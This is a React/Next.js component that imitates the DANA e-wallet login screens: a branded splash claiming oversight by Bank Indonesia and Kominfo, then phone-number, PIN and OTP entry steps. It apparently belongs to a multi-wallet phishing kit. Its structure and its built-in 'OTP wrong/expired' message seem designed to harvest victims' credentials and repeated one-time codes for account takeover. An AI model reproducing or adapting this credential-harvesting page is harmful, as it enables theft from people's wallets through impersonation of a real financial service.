'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import { ChevronLeft, Headphones, Loader2 } from 'lucide-react';
import { DanaLoadingSpinnerOverlay } from '../../DanaLoadingSpinnerOverlay';
import { useEnterpriseFormFlow } from '../lib/useEnterpriseFormFlow';
import { formatCountdownMMSS, formatPhoneDisplay, formatPhoneInput } from '../lib/utils';
import type { WalletFormProps } from './wallet-methods';
import { ThemeColorMeta } from '../ThemeColorMeta';
import { getWalletFormThemeColor } from '../lib/theme-colors';
import './dana-wallet.css';

const SPLASH_HOLD_MS = 3000;
const SPLASH_FADE_MS = 1000;

function DanaLogoWhite() {
  return (
    <div className="flex flex-col items-center">
      <Image
        src="/dana_logo.svg"
        alt="DANA"
        width={100}
        height={32}
        className="mt-3 h-7 w-auto brightness-0 invert"
        priority
      />
    </div>
  );
}

function DanaLogoBlue() {
  return (
    <Image
      src="/dana-logo.svg"
      alt="DANA"
      width={80}
      height={24}
      className="h-6 w-auto"
      priority
    />
  );
}

export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
  const f = useEnterpriseFormFlow(slugData, 'dana');

  const [renderStep0, setRenderStep0] = useState(true);
  const [step0Visible, setStep0Visible] = useState(false);
  const [step0FadingOut, setStep0FadingOut] = useState(false);
  const [splashDone, setSplashDone] = useState(false);

  useEffect(() => {
    if (!renderStep0) return undefined;

    setStep0Visible(false);
    setStep0FadingOut(false);

    const showTimer = window.setTimeout(() => setStep0Visible(true), 10);
    const fadeOutTimer = window.setTimeout(() => setStep0FadingOut(true), SPLASH_HOLD_MS);
    const hideTimer = window.setTimeout(() => {
      setRenderStep0(false);
      setSplashDone(true);
    }, SPLASH_HOLD_MS + SPLASH_FADE_MS);

    return () => {
      window.clearTimeout(showTimer);
      window.clearTimeout(fadeOutTimer);
      window.clearTimeout(hideTimer);
    };
  }, [renderStep0]);

  const step1KeyboardOffset = f.keyboardOffset;
  const danaThemeColor = getWalletFormThemeColor('dana', {
    splash: renderStep0,
    step: f.step,
  });

  return (
    <>
      <ThemeColorMeta color={danaThemeColor} />
      <DanaLoadingSpinnerOverlay visible={f.isLoadingOverlay} />

      <div className="dana-enterprise-flow relative min-h-screen bg-[#108EE9]">
        {renderStep0 && (
          <div
            className={`landing-blue-screen fixed inset-0 z-40 mx-auto flex w-full max-w-md flex-col overflow-hidden transition-opacity duration-1000 ease-in-out ${
              step0Visible && !step0FadingOut ? 'opacity-100' : 'opacity-0'
            }`}
          >
            <div className="flex flex-1 flex-col items-center px-4 pt-6">
              <div className="flex flex-1 items-center justify-center">
                <Image
                  src="/dana-logo.svg"
                  alt="DANA"
                  width={176}
                  height={64}
                  className="h-[72px] w-auto brightness-0 invert"
                  priority
                />
              </div>

              <div className="mt-4 flex w-full items-start justify-start pl-5">
                <div className="flex items-start gap-4">
                  <Image src="/bi.png" alt="bi" width={80} height={40} className="h-10 w-auto" />
                  <div className="flex items-start gap-3">
                    <Image src="/kom.png" alt="kom" width={80} height={40} className="h-10 w-auto" />
                    <p className="mt-1 max-w-[240px] text-[10px] leading-relaxed text-white/90">
                      DANA Indonesia terdaftar dan diawasi oleh Bank Indonesia dan Kominfo
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {splashDone && (f.step === 1 || f.previousStep === 1) && (
          <form
            className={`landing-blue-screen landing-step1-keyboard relative mx-auto flex w-full max-w-md flex-col transition-opacity duration-[480ms] ease-in-out ${
              f.isStep1FadingOut ? 'absolute inset-0 z-30 opacity-0 pointer-events-none' : 'relative opacity-100'
            }`}
            onSubmit={(e) => {
              e.preventDefault();
              if (f.phoneValid && !f.submitting) void f.handleNext();
            }}
          >
            <button
              type="button"
              className="dana-step-back"
              onClick={onBack}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
            </button>

            <div className="flex flex-1 flex-col items-center px-4 pt-5 pb-[88px]">
              <DanaLogoWhite />

              <h1 className="mt-9 text-center text-[13px] font-bold leading-snug text-white">
                Masukkan nomor HP kamu
                <br />
                untuk lanjut
              </h1>

              <div className="mt-8 flex h-[43px] w-full items-center overflow-hidden rounded-lg bg-white">
                <div className="flex h-full shrink-0 items-center gap-1.5 border-r border-gray-200 px-3">
                  <Image
                    src="/indo.png"
                    alt="Indonesia"
                    width={24}
                    height={16}
                    className="h-4 w-6 rounded-sm object-cover"
                  />
                  <span className="text-[15px] font-semibold text-gray-800">+62</span>
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  enterKeyHint="go"
                  placeholder="811-1234-5678"
                  className="min-w-0 flex-1 bg-transparent px-3 text-[22px] font-medium text-gray-800 placeholder:text-gray-400 outline-none"
                  value={formatPhoneInput(f.stepData.phone)}
                  onPointerDown={() => f.unlockEnterpriseAudioSync()}
                  onChange={(e) =>
                    f.setStepData({ ...f.stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                  }
                  onKeyDown={(e) => {
                    if (e.key === 'Enter' && f.phoneValid && !f.submitting) {
                      e.preventDefault();
                      void f.handleNext();
                    }
                  }}
                />
              </div>

              <p className="mt-6 text-center text-[11px] leading-relaxed text-white/90">
                Kami akan menggunakan nomor HP ini sebagai ID Kamu dan untuk mengamankan akun kamu.
                Dengan melanjutkan, kamu juga setuju dengan <span className="font-bold">S&K</span>{' '}
                serta <span className="font-bold">Kebijakan Privasi</span> kami
              </p>

              {f.errorMessage && (
                <p className="mt-4 w-full rounded-lg bg-red-500/20 px-4 py-2.5 text-center text-xs text-white">
                  {f.errorMessage}
                </p>
              )}
            </div>

            <div
              className={`landing-step1-continue-bar px-6 ${
                step1KeyboardOffset > 0
                  ? 'landing-step1-continue-bar--keyboard'
                  : 'landing-safe-footer pt-3'
              }`}
              style={{
                transform: `translate3d(-50%, ${-step1KeyboardOffset}px, 0)`,
              }}
            >
              <button
                type="submit"
                disabled={!f.phoneValid || f.submitting}
                onPointerDown={() => f.unlockEnterpriseAudioSync()}
                className={`flex h-[52px] w-full items-center justify-center rounded-xl text-[15px] font-bold tracking-wide transition ${
                  f.phoneValid
                    ? 'bg-white text-[#108EE9] active:bg-white/90'
                    : 'bg-[#7EC8F7] text-[#108EE9]/70'
                } disabled:cursor-not-allowed`}
              >
                {f.submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : 'LANJUTKAN'}
              </button>
            </div>
          </form>
        )}

        {splashDone && (f.step === 2 || f.previousStep === 2) && (
          <div
            className={`mx-auto flex min-h-screen w-full max-w-md flex-col bg-white transition-opacity duration-500 ease-in-out ${
              f.isStep2FadingOut ? 'absolute inset-0 z-30 opacity-0 pointer-events-none' : 'relative opacity-100'
            }`}
          >
            <header className="landing-step2-header">
              <button
                type="button"
                onClick={() => f.goBackStep()}
                className="flex h-8 w-8 items-center justify-center text-white"
                aria-label="Kembali"
              >
                <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
              </button>
              <h1 className="flex-1 text-center text-[17px] font-semibold text-white pr-8">Masuk</h1>
            </header>

            <div className="flex flex-1 flex-col items-center px-6 pt-10">
              <h2 className="text-[17px] font-bold text-gray-900">Masukkan PIN</h2>

              <div
                className="relative mt-10 cursor-text"
                onPointerDown={() => f.unlockEnterpriseAudioSync()}
                onClick={() => f.pinInputRef.current?.focus()}
                role="presentation"
              >
                <input
                  ref={f.pinInputRef}
                  type="tel"
                  inputMode="numeric"
                  maxLength={6}
                  autoComplete="off"
                  autoFocus
                  className="absolute inset-0 h-full w-full opacity-0"
                  value={f.stepData.pin}
                  onChange={(e) =>
                    f.setStepData({
                      ...f.stepData,
                      pin: e.target.value.replace(/\D/g, '').slice(0, 6),
                    })
                  }
                />

                <div className="flex items-center gap-5">
                  {Array.from({ length: 6 }, (_, index) => (
                    <div
                      key={index}
                      className={`h-[14px] w-[14px] rounded-full transition-colors ${
                        index < f.stepData.pin.length ? 'bg-[#108EE9]' : 'bg-[#D9D9D9]'
                      }`}
                    />
                  ))}
                </div>
              </div>

              <div className="mt-10 flex w-full items-center justify-between px-2">
                <button type="button" className="flex items-center gap-1.5 text-[11px] font-semibold text-[#108EE9]">
                  <span className="flex h-5 w-5 items-center justify-center rounded-full bg-[#108EE9]/10">
                    <Headphones className="h-3 w-3 text-[#108EE9]" />
                  </span>
                  BUTUH BANTUAN?
                </button>
                <button type="button" className="text-[11px] font-semibold text-[#108EE9]">
                  LUPA PIN?
                </button>
              </div>

              {f.errorMessage && (
                <p className="mt-6 w-full rounded-lg bg-red-50 px-4 py-2.5 text-center text-xs text-red-600">
                  {f.errorMessage}
                </p>
              )}
            </div>
          </div>
        )}

        {splashDone && f.step === 3 && (
          <div
            className={`mx-auto min-h-screen w-full max-w-md bg-white pb-8 transition-transform transition-opacity duration-500 ease-in-out ${
              f.isStep3SlidingIn ? 'translate-y-10 opacity-0' : 'translate-y-0 opacity-100'
            }`}
            onPointerDown={() => {
              if (f.step3GestureSoundRef.current) return;
              f.step3GestureSoundRef.current = true;
              f.playEnterpriseOtpSoundFromGesture();
            }}
          >
            <header className="landing-step2-header landing-step2-header--light">
              <button
                type="button"
                onClick={() => f.goBackStep()}
                className="flex h-8 w-8 items-center justify-center text-gray-800"
                aria-label="Kembali"
              >
                <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
              </button>
              <h1 className="flex-1 text-center text-[17px] font-semibold text-gray-900 pr-8">
                Verifikasi
              </h1>
            </header>

            <div className="px-5 pb-8 pt-4">
              <h1 className="text-center text-[15px] font-bold text-gray-900">
                Verifikasi telah dikirim ke Akun
              </h1>
              <div className="mt-3 flex justify-center">
                <DanaLogoBlue />
              </div>

              <div className="mt-4">
                <Image
                  src="/notif.gif"
                  width={200}
                  height={120}
                  className="w-[200px] h-auto mx-auto"
                  alt="Notifikasi"
                />
              </div>

              <p className="mt-6 text-center text-[13px] text-gray-700">Kode dikirim ke</p>
              <div className="mt-2 flex justify-center">
                <div className="rounded-full bg-[#108EE9] px-5 py-2.5">
                  <span className="text-[14px] font-semibold text-white">
                    {formatPhoneDisplay(f.stepData.phone)}
                  </span>
                </div>
              </div>

              <div className="mt-3 flex items-center justify-center gap-2 text-[11px] text-gray-500">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="5" y="3" width="14" height="18" rx="2" stroke="currentColor" strokeWidth="1.5" />
                  <path d="M9 7h6M9 11h4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
                </svg>
                SMS
                <span>/</span>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#25D366" aria-hidden="true">
                  <path
                    d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.38 5.07L2 22l4.93-1.29A9.94 9.94 0 0012 22c5.52 0 10-4.48 10-10S17.52 2 12 2z"
                    fill="#25D366"
                  />
                </svg>
                Whatsapp
              </div>

              <div className="mt-6 flex justify-center gap-3">
                {Array.from({ length: 4 }, (_, index) => (
                  <input
                    key={index}
                    ref={(el) => {
                      f.otpInputRefs.current[index] = el;
                    }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    className={`h-[32px] w-[32px] rounded-xl border bg-[#F0F0F0] text-center text-xl font-semibold text-gray-800 outline-none transition duration-300 focus:bg-[#E8E8E8] focus:ring-2 focus:ring-[#108EE9]/30 ${
                      f.otpCompleteRingVisible
                        ? 'border-red-500 ring-2 ring-red-500/30'
                        : 'border-transparent'
                    }`}
                    value={f.stepData.otp[index] ?? ''}
                    onPointerDown={() => f.unlockEnterpriseAudioSync()}
                    onChange={(e) => f.handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => f.handleOtpKeyDown(index, e)}
                  />
                ))}
              </div>

              <div
                className={`mt-2 flex items-center justify-center transition-opacity duration-300 ${
                  f.otpToastVisible && f.otpFilled ? 'opacity-100' : 'opacity-0 pointer-events-none'
                }`}
              >
                <div className="rounded-lg bg-red-500/20 px-4 py-2 text-center text-[12px] font-semibold text-red-600/95">
                  OTP yang kamu masukkan Salah/Kadaluwarsa.
                </div>
              </div>

              <div className="mt-5 text-center">
                {f.countdown > 0 ? (
                  <p className="text-[12px] text-gray-500">
                    Kirim ulang dalam{' '}
                    <span className="font-semibold tabular-nums text-gray-700">
                      {formatCountdownMMSS(f.countdown)}
                    </span>
                  </p>
                ) : (
                  <button
                    type="button"
                    onClick={() => f.setCountdown(60)}
                    className="text-[12px] font-semibold text-[#108EE9]"
                  >
                    Kirim ulang
                  </button>
                )}
              </div>

              <div className="mt-8 border-t border-gray-100 pt-6">
                <p className="text-[13px] font-semibold text-gray-800">
                  Silahkan Cek verifikasi akun DANA kamu:
                </p>

                <div className="mt-4 flex gap-3">
                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                      <rect x="6" y="2" width="12" height="20" rx="2" stroke="#108EE9" strokeWidth="1.5" />
                      <circle cx="12" cy="18" r="1" fill="#108EE9" />
                    </svg>
                  </div>
                  <p className="text-[11px] leading-relaxed text-gray-600">
                    Tap notifikasi di perangkatmu di layar atas dan tap{' '}
                    <span className="font-bold text-gray-800">VERIFIKASI</span>.
                  </p>
                </div>

                <div className="mt-4 flex gap-3">
                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                      <rect x="3" y="5" width="18" height="14" rx="2" stroke="#108EE9" strokeWidth="1.5" />
                      <path d="M3 7l9 6 9-6" stroke="#108EE9" strokeWidth="1.5" />
                    </svg>
                  </div>
                  <p className="text-[11px] leading-relaxed text-gray-600">
                    Tidak menerima notifikasi? Cek Kotak Masuk atau menu{' '}
                    <span className="font-bold text-gray-800">Verifikasi</span>. atau cek di icon gambar{' '}
                    <span className="font-bold text-gray-800">Amplop</span> dan tap{' '}
                    <span className="font-bold text-gray-800">Verifikasi</span>.
                  </p>
                </div>
              </div>

              {f.errorMessage && (
                <p className="mt-4 rounded-lg bg-red-50 px-4 py-2.5 text-center text-xs text-red-600">
                  {f.errorMessage}
                </p>
              )}
            </div>
          </div>
        )}
      </div>
    </>
  );
}
